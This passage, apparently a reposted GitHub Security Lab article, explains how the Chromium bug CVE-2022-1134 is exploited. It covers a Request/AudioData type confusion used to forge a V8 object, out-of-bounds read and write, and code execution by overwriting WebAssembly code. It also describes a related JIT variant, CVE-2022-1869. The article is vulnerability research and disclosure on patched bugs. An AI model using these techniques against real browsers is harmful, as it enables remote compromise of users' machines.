+<p>While getting an information leak from a <code>getter</code> is easy, one may wonder how to turn this primitive into one that also allows arbitrary write. The answer is to cause type confusion in the object returned by the <code>getter</code>. Many Blink objects have properties that are JavaScript objects. For example, <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/core/fetch/request.h">Request</a></code> has a <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/core/fetch/request.h;l=84">signal</a></code> property that returns the member <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/core/fetch/request.h;l=120">signal_</a></code> as a JavaScript object when the property accessor in <code>gen/third_party/blink/nderer/bindings/core/v8/v8_request.cc</code> is called:</p>
+<pre><code>void SignalAttributeGetCallback(
+    const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;
+  RUNTIME_CALL_TIMER_SCOPE_DISABLED_BY_DEFAULT(info.GetIsolate(),
+                                               "Blink_Request_signal_Getter");
+  BLINK_BINDINGS_TRACE_EVENT("Request.signal.get");
+
+<p>  v8::Local&lt;v8::Object&gt; v8_receiver &#x3D; info.This();<br>  Request* blink_receiver &#x3D; V8Request::ToWrappableUnsafe(v8_receiver);<br>  auto&amp;&amp; return_value &#x3D; blink_receiver-&gt;signal();<br>  bindings::V8SetReturnValue(info, return_value, blink_receiver);<br>&amp;#125;<br></p></code></pre><p></p>
+<p>In the above, the <code>return_value</code> object returned from <code>blink_receiver-&gt;signal()</code> is a <code>ScriptWrappable</code> object (an <code>AbortSignal</code> to be precise) that gets returned as a V8 object using the <code>bindings::V8SetReturnValue</code> function. This function returns the address of the V8 object located in its <code>main_world_wrapper_</code> field. In order to create a fake JavaScript object as the return value, I can use a type confusion between <code>Request</code> and <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/modules/webcodecs/audio_data.h">AudioData</a></code>. An <code>AudioData</code> object has a <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/modules/webcodecs/audio_data.h;l=67">timestamp_</a></code> field that is at the same offset as the <code>signal_</code> property of <code>Request</code> and can be set to an arbitrary <code>int64_t</code> value when creating the <code>AudioData</code>. The type confusion will cause the memory at the address represented by <code>timestamp_</code> to be interpreted as the <code>ScriptWrappable</code> object <code>return_value</code>. By specifying <code>timestamp_</code> to the address of some data that I can control, I can create a fake <code>return_value</code> object.</p>
+<p>To do so, I first create some JavaScript objects in the following order:</p>
+<pre><code>var imgDataStore = new ArrayBuffer(48)
+var imgData = new Uint8ClampedArray(imgDataStore);
+var doubleArr = [1.1, 2.2, 3.3, 4.4, 5.5];
+var objArr = [imgData];
+var img = new ImageData(imgData, 8, 6);
+</code></pre>
+<p>Recall that in <a href="#objectaddress">“Getting object address”</a>. I obtained the address of the <code>DOMUint8ClampedArray</code> that backs <code>img</code> as the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/core/html/canvas/image_data.h;l=224">data_u8_</a></code> field of <code>img</code>. As a <code>DOMUint8ClampedArray</code> stores a pointer to its backing store in the field <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/a9048e03fba5ba168b4b84d5c96f9b11e24505fe:third_party/blink/renderer/core/typed_arrays/dom_array_buffer_view.h;l=143;drc=edd35d72b5ae24aab2f4829e2030e6e6ab7b7980">raw_base_address_</a></code> at offset 0x10, I can now use the type confusion between <code>AudioData</code> and <code>Request</code>, and then set <code>timestamp_</code> of <code>AudioData</code> to the value of <code>data_u8_ + 0x8</code>. This causes <code>data_u8_ + 0x8</code> to be interpreted as a pointer to a <code>ScriptWrappble</code> (<code>AbortSignal</code>) object and to be used as the return value for <code>blink_receiver-&gt;signal()</code>. This means that the <code>raw_base_address_</code> field of the <code>DOMUint8ClampedArray</code> (offset 0x10) is interpreted as the <code>main_world_wrapper_</code> (offset 0x8) of <code>return_value</code> from <code>blink_receiver-&gt;signal()</code>:</p>
+<p><img><img alt class="alignnone size-full wp-image-65774 width-fit" data-recalc-dims="1" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="540" loading="lazy" sizes="(max-width: 960px) 100vw, 960px" src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-5.png?resize=960%2C540" width="960"></p>
+<p>The first 8 bytes of <code>imgData</code> are now interpreted as the address of the V8 object that gets returned from the <code>Request::signal</code> JavaScript call. By setting it to an address with data that I control, I can use this to create a fake V8 object.</p>
+<p>To fake this V8 object, I’ll use the element store of the array <code>doubleArr</code>. As explained in the section “Trick #1: Use ArrayLiterals for Information” of <a target="_blank" rel="external nofollow noopener noreferrer" href="https://tiszka.com/blog/CVE_2021_21225_exploit.html">Exploiting CVE-2021-21225 and disabling W^X</a> by Brendon Tiszka, the elements in a small <code>Array</code> are inlined and either placed immediately before or after the <code>Array</code>, depending on elements type. The offset to the inlined elements can be found easily using <code>%DebugPrint</code>:</p>
+<pre><code>var doubleArr = [1.1, 2.2, 3.3, 4.4, 5.5];
+%DebugPrint(doubleArr)
+DebugPrint: 0x20870004c869: [JSArray]
+ ...
+ - elements: 0x20870004c839 &lt;FixedDoubleArray[5]&gt; [PACKED_DOUBLE_ELEMENTS]
+ ...
+</code></pre>
+<p>The address of the elements is stored in the field <code>elements</code>. So in our case, for example, the elements are placed at an offset of <code>-0x30</code> from the <code>Array</code> itself (<code>0x20870004c839 - 0x20870004c869</code>). By using the address of <code>imgData</code> obtained previously, the address of the <code>elements</code> can also be computed. This means that I can use <code>doubleArr</code> to create a V8 fake object and use it in the <code>main_world_wrapper_</code> of the fake <code>ScriptWrappable</code> (<code>AbortSignal</code>) object:</p>
+<p><img><img alt class="alignnone size-full wp-image-65775 width-fit" data-recalc-dims="1" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="540" loading="lazy" sizes="(max-width: 960px) 100vw, 960px" src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-6.png?resize=960%2C540" width="960"></p>
+<p>I can then use this to obtain a fake <code>Array</code> that will give me an out-of-bounds (OOB) read and write primitive. In V8, a JavaScript <code>Array</code> has the following memory layout.</p>
+<p><img><img alt class="alignnone size-full wp-image-65776 width-fit" data-recalc-dims="1" data-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" height="154" loading="lazy" sizes="(max-width: 491px) 100vw, 491px" src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-7.png?resize=491%2C154" width="491"></p>
+<p>A JavaScript object has its <code>map</code> as its first field. In V8, this field is used for determining the type of an object, so by putting the <code>map</code> of a double <code>Array</code> in our fake object, V8 will interpret it as a double array. By setting the <code>elements</code> field, which points to the backing store of the <code>Array</code>, to the same value as the <code>elements</code> of <code>doubleArr</code>, and then setting <code>length</code> to be a large value, I can cause the fake double <code>Array</code> that is returned from <code>Request::signal</code> to perform out-of-bounds reads and writes. Note that all the fields are of size 4 bytes. This is because all V8 addresses are stored as <em>compressed</em> pointers. As the top 32 bits of all addresses within a V8 heap are the same, only the lower 32 bits of an address are stored. These addresses are called compressed pointers. The top 32 bits of the addresses are stored in a registry, which is then applied to the compressed addresses to obtain 64-bit addresses when dereferencing.</p>
+<p>Once out-of-bounds read and write is achieved, gaining remote code execution is fairly standard and straightforward. Readers can consult, for example, “<a target="_blank" rel="external nofollow noopener noreferrer" href="https://tiszka.com/blog/CVE_2021_21225_exploit.html">Exploiting CVE-2021-21225 and disabling W^X</a>” by Brendon Tiszka or the “Gaining code execution” section of my other <a target="_blank" rel="external nofollow noopener noreferrer" href="https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_30632/">article</a>.</p>
+<p>At this stage, gaining remote code execution consists of the following steps. Let’s call the fake object I’ve obtained the fake <code>signal</code> (which is interpreted as a double <code>Array</code> with a large length that allows me to overwrite and read any object that is placed after the variable <code>doubleArr</code>).</p>
+<ol>
+<li>Place an <code>Object</code> <code>Array</code> after <code>doubleArr,</code>and use the OOB read primitive to read the addresses of the objects stored in this array. This allows me to obtain the address of any V8 object.</li>
+<li>Create a <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/Instance">WebAssembly.Instance</a></code> object, and use step one to obtain its address, then use the arbitrary address read primitive to read the pointer to the compiled <code>wasm</code> code. This will be the address of a <code>RWX</code> page that contains the code to be executed when the <code>main</code> function of the <code>WebAssembly.Instance</code> object is called. (The <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/Instance">WebAssembly.Instance</a></code> is created in the “Old space,” so its address cannot be read simply by using the OOB read primitive.)</li>
+<li>Place a <code>TypedArray</code> object after <code>doubleArr,</code> and use the OOB write primitive to overwrite its <code>data_ptr</code> field to the <code>RWX</code> page address leaked from step two.</li>
+<li>As the <code>data_ptr</code> field of a <code>TypedArray</code> points to its backing store, writing to the <code>TypedArray</code> now overwrites the <code>wasm</code> code that will be executed by the <code>WebAssembly.Instance</code> object from step two. I can then write shell code to the <code>TypedArray</code> to achieve code execution.</li>
+</ol>
+<p>As I’ve reported in my <a target="_blank" rel="external nofollow noopener noreferrer" href="https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_37975/">previous article</a> on Linux and ChromeOS, a flag <code>wasm-memory-protection-keys</code> was introduced to protect <code>wasm</code> code region from being overwritten (see “The beginning of the end of <code>wasm RWX</code>?” section in that article). This, however, can be bypassed by simply overwriting the <code>wasm-memory-protection-keys</code> as I did in that article.</p>
+<p>The exploit can be found <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE_2022_1134">here</a> with some setup notes.</p>
+<h2 id="the-four-part-trilogy">The four-part trilogy<a aria-label="The four-part trilogy" class="heading-link pl-2 text-italic text-bold" href="#the-four-part-trilogy"></a></h2>
+<p>As functionalities in V8 are often implemented in multiple places, according to the optimization level, the same bug sometimes occurs multiple times in the different implementations. For example, the bug <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=907714">CVE-2018-18359</a> reported by cyrilliu was an OOB access bug, because <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct">Reflect.construct</a></code> assumed all constructor functions have the <code>prototype</code> field (not the same as the <code>prototype</code> field in the JavaScript object, but rather an internal field in the C++ object) and accessed it from a memory offset directly. Unfortunately, the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">Proxy constructor</a></code> is an exception. Not only does it not have the <code>prototype</code> field, but accessing it can result in OOB access. This bug was found in the slow runtime implementation. A few months later, the same issue was found in the JIT implementation of <code>Reflect.construct</code> by Samuel Groß as <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1799">CVE-2019-5843</a>. Yet a few months later, the same bug in the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://v8.dev/docs/torque">torque</a></code> implementation was found as <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=999310">CVE-2019-5877</a> and was used as part of the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices/blob/master/us-20-Gong-TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices-wp.pdf">TiYuZong full chain</a> of Guang Gong. So let’s learn from history, and check the other implementations of super property access. As it turns out, the JIT implementation also suffers the same problem. When compiling optimized code for simple API property access, the JIT implementation checks the map in <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/75c36c7712bea160e69de6b87b864dfcebab239e:v8/src/compiler/access-info.cc;l=573">AccessorAccessInfoHelper</a></code>:</p>
+<pre><code>PropertyAccessInfo AccessorAccessInfoHelper(
+    Isolate* isolate, Zone* zone, JSHeapBroker* broker,
+    const AccessInfoFactory* ai_factory, MapRef receiver_map, NameRef name,
+    MapRef map, base::Optional&lt;JSObjectRef&gt; holder, AccessMode access_mode,
+    AccessorsObjectGetter get_accessors) &#123;
+    ...
+    CallOptimization::HolderLookup lookup;
+    Handle&lt;JSObject&gt; holder_handle = broker-&gt;CanonicalPersistentHandle(
+        optimization.LookupHolderOfExpectedType(
+            broker-&gt;local_isolate_or_isolate(), receiver_map.object(),     //&lt;------- checks that the receiver_map is compatible
+            &amp;lookup));
+</code></pre>
+<p>On the face of it, it seems to be correct, as we’ve seen in the section <a href="#heading=h.iddgaybfi3d2">“The vulnerability,”</a> that property accessor operates on the <code>receiver</code> rather than the <code>lookup_start_object</code>, so the <code>map</code> of the <code>receiver</code> should be checked, which is what it does here. The only problem is that the <code>receiver_map</code> is not the <code>map</code> of the <code>receiver</code>. The <code>AccessorAccessInfoHelper</code> is used, for example, in <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/75c36c7712bea160e69de6b87b864dfcebab239e:v8/src/compiler/js-native-context-specialization.cc;l=1040">ReducedNameAccess</a></code> to create <code>PropertyAccessInfo</code> (2 in the below snippet):</p>
+<pre><code>Reduction JSNativeContextSpecialization::ReduceNamedAccess(
+    Node* node, Node* value, NamedAccessFeedback const&amp; feedback,
+    AccessMode access_mode, Node* key) &#123;
+  ...
+  ZoneVector&lt;MapRef&gt; inferred_maps(zone());
+  if (!InferMaps(lookup_start_object, effect, &amp;inferred_maps)) &#123;      //&lt;----------- 1.
+    for (const MapRef&amp; map : feedback.maps()) &#123;
+      inferred_maps.push_back(map);
+    &#125;
+  &#125;
+  ...
+  &#123;
+    ZoneVector&lt;PropertyAccessInfo&gt; access_infos_for_feedback(zone());
+    for (const MapRef&amp; map : inferred_maps) &#123;
+      ...
+      PropertyAccessInfo access_info = broker()-&gt;GetPropertyAccessInfo(
+          map, feedback.name(), access_mode, dependencies());        //&lt;------------ 2.
+      access_infos_for_feedback.push_back(access_info);
+</code></pre>
+<p>The argument <code>map</code> passed in <code>GetPropertyAccessInfo</code> in 2 eventually becomes the <code>receiver_map</code> that is passed to <code>AccessorAccessInfoHelper</code>. However, this <code>map</code> is, in fact, a map that is inferred from the <code>lookup_start_object</code>, instead of the <code>receiver</code> (1 in the above), so the <code>lookup_start_object</code> map was checked in the JIT implementation as well. On the other hand, the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/75c36c7712bea160e69de6b87b864dfcebab239e:v8/src/compiler/js-native-context-specialization.cc;l=2220">BuildPropertyLoad</a></code> is used to compile code for loading properties, which uses the actual <code>receiver</code> to make the call:</p>
+<pre><code>base::Optional&lt;JSNativeContextSpecialization::ValueEffectControl&gt;
+JSNativeContextSpecialization::BuildPropertyLoad(
+    Node* lookup_start_object, Node* receiver, Node* context, Node* frame_state,
+    Node* effect, Node* control, NameRef const&amp; name,
+    ZoneVector&lt;Node*&gt;* if_exceptions, PropertyAccessInfo const&amp; access_info) &#123;
+  ...
+  Node* value;
+  if (access_info.IsNotFound()) &#123;
+    value = jsgraph()-&gt;UndefinedConstant();
+  &#125; else if (access_info.IsFastAccessorConstant() ||
+             access_info.IsDictionaryProtoAccessorConstant()) &#123;
+    ...
+    value =
+        InlinePropertyGetterCall(receiver, receiver_mode, context, frame_state,  //&lt;---- receiver used for making getter call
+                                 &amp;effect, &amp;control, if_exceptions, access_info);
+  &#125; else if (access_info.IsModuleExport()) &#123;
+</code></pre>
+<p>So the JIT implementation also suffers the problem. I reported this as bug <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1309467">1309467</a> and included a proof of concept to show that it can bypass the original <a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/v8/v8/+/9c3d4b3556b2797fa9d9f4bee915e8502608312f">patch</a>. It was disclosed in Chrome release <a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromereleases.googleblog.com/2022/05/stable-channel-update-for-desktop_24.html">102.0.5005.61</a> as CVE-2022-1869.</p>
+<h2 id="conclusions">Conclusions<a aria-label="Conclusions" class="heading-link pl-2 text-italic text-bold" href="#conclusions"></a></h2>
+<p>In this post I’ve covered CVE-2022-1134 and some variants of the bug. I’ve also looked at some internals of inline caching in V8 and how V8 interacts with Blink via the V8 API. Apart from being a close variant of two previous bugs (with one used in the high profile Tianfu cup pwning contest), which highlights the complexity of the property access system in V8, the current bug also involves the interactions between Blink and V8 and could not be found by fuzzing V8 alone (which is unlike the previous two variants).</p>
+<p>In most public research, researchers either focus on bugs that are specific to V8 or Blink, and the bugs involved rarely cross the boundary between the two. Recently, there have been bugs that were exploited in the wild that involve Blink objects breaking assumptions in V8, such as <a target="_blank" rel="external nofollow noopener noreferrer" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30551.html">CVE-2021-30551</a> and <a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_25.html">CVE-2022-1096</a>. Being able to discover and exploit these bugs requires a great wealth and depth of knowledge in both Blink and V8, and these bugs give us a glimpse of both the resources and expertise that bad actors possess and perhaps an area where more research is needed.</p>
+</body></html>
+
+</div>
+
+<div>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="The Chromium super (inline cache) type confusion" href="https://github.blog/2022-06-29-the-chromium-super-inline-cache-type-confusion/" target="_blank" rel="external nofollow noopener noreferrer"><div class="left"><span class="title">The Chromium super (inline cache) type confusion</span><span class="desc fs12">https://github.blog/2022-06-29-the-chromium-super-inline-cache-type-confusion/</span></div><div class="right"><div class="lazy img" data-bg="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.1/link/8f277b4ee0ecd.svg"></div></div></a></div>
+</div>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/me-shaon/GLWTPL/blob/master/translations/LICENSE_zh-CN">GLWT（Good Luck With That，祝你好运）公共许可证</a> 许可协议。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/rss/5e7b277.html">36氪：【新东方主播董宇辉被抢注商标，目前商标…<span class="note">较早</span></a><div class="line"></div><a id="prev" href="/rss/a1be5524.html">大河财立方：【满帮：即日起恢复“运满满”、“货车帮…<span class="note">较新</span></a></section></div>
+
+
+<div class="related-wrap reveal" id="related-posts">
+    <section class="header">
+      <div class="title cap theme">您可能感兴趣的文章</div>
+    </section>
+    <section class="body">
+    <div class="related-posts"><a class="item" href="/rss/f3e6218a.html" title="Creating a More Comprehensive Dependency Graph With Build Time Detection"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://picsum.photos/400/300?random=968"></div><span class="title">Creating a More Comprehensive Dependency Graph With Build Time Detection</span></a><a class="item" href="/rss/bb1df730.html" title="GitHub Advisory Database Now Supports Erlang and Elixir Packages!"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://picsum.photos/400/300?random=3734"></div><span class="title">GitHub Advisory Database Now Supports Erlang and Elixir Packages!</span></a><a class="item" href="/rss/5c851d6a.html" title="GitHub Copilot Is Generally Available to All Developers"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://github.blog&url=https://s.w.org/images/core/emoji/14.0.0/72x72/1f680.png"></div><span class="title">GitHub Copilot Is Generally Available to All Developers</span></a><a class="item" href="/rss/1b972bda.html" title="GitHub Enables the Development of Functional Safety Applications by Adding Support for Coding Standards AUTOSAR C++  and CERT C++"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/image1-7.png?w=300&resize=840%2C209"></div><span class="title">GitHub Enables the Development of Functional Safety Applications by Adding Support for Coding Standards AUTOSAR C++  and CERT C++</span></a><a class="item" href="/rss/59277e24.html" title="Highlights From Git 2.37"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://picsum.photos/400/300?random=6451"></div><span class="title">Highlights From Git 2.37</span></a><a class="item" href="/rss/87e9f8dd.html" title="Improve Git Monorepo Performance With a File System Monitor"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/mono-1.png?resize=1024%2C419"></div><span class="title">Improve Git Monorepo Performance With a File System Monitor</span></a><a class="item" href="/rss/cc31db52.html" title="Improving Git Protocol Security on GitHub Enterprise Server"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://picsum.photos/400/300?random=556"></div><span class="title">Improving Git Protocol Security on GitHub Enterprise Server</span></a><a class="item" href="/rss/f6fbd38f.html" title="Thank You to Our Maintainers"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/regions-june-23-b.png?resize=1024%2C538"></div><span class="title">Thank You to Our Maintainers</span></a><a class="item" href="/rss/668acf80.html" title="What’s New in Codespaces for Organizations"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Codespaces-B-1.png?resize=862%2C194"></div><span class="title">What’s New in Codespaces for Organizations</span></a><a class="item" href="/rss/b9b0a896.html" title="A Stronger Bridge to Zero Trust"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.cloudflare.com&url=http://blog.cloudflare.com/content/images/2022/06/image1-43.png"></div><span class="title">A Stronger Bridge to Zero Trust</span></a><a class="item" href="/rss/8c1e0e6b.html" title="Announcing Gateway + CASB"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.cloudflare.com&url=http://blog.cloudflare.com/content/images/2022/06/image2-40.png"></div><span class="title">Announcing Gateway + CASB</span></a><a class="item" href="/rss/62f69d4b.html" title="Cloudflare One vs Zscaler Zero Trust Exchange: Who Is Most Feature Complete? It’s Not Who You Might Expect"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://blog.cloudflare.com&url=http://blog.cloudflare.com/content/images/2022/06/Zero-Trust-Exchange.png"></div><span class="title">Cloudflare One vs Zscaler Zero Trust Exchange: Who Is Most Feature Complete? It’s Not Who You Might Expect</span></a><a class="item" href="/rss/e8c9b820.html" title="Did You Know That People Are Still Creating NES Games? Ready Up Because @KenneyNL Has Shared Some Notes on How You Can Too:"><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://twitter.com&url=https://pbs.twimg.com/media/FWY4Q0zWIAA5Ici?format=jpg&name=orig"></div><span class="title">Did You Know That People Are Still Creating NES Games? Ready Up Because @KenneyNL Has Shared Some Notes on How You Can Too:</span></a><a class="item" href="/rss/5e551241.html" title="Lists Are Now Available on GitHub Mobile for Android! You Can Create Public Lists by Starring a Repo Anywhere in the App. You Can Also Delete Lists, m..."><div class="img"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cors.mhuig.top/?r=https://twitter.com&url=https://pbs.twimg.com/media/FWW65UHWQAcxe4e?format=jpg&name=orig"></div><span class="title">Lists Are Now Available on GitHub Mobile for Android! You Can Create Public Lists by Starring a Repo Anywhere in the App. You Can Also Delete Lists, m...</span></a><a 